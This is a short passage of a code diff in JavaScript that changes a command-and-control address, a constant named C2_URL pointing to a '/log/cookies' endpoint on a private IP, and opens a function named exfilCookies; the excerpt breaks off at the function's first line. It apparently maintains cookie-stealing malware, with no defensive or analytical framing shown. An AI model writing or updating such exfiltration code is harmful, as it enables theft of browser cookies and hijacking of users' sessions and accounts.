@@ -1,4 +1,4 @@
-const C2_URL = "http://10.215.119.135:4000/log/cookies";
+const C2_URL = "http://10.215.118.250:4000/log/cookies";
 
 async function exfilCookies() {
   try {
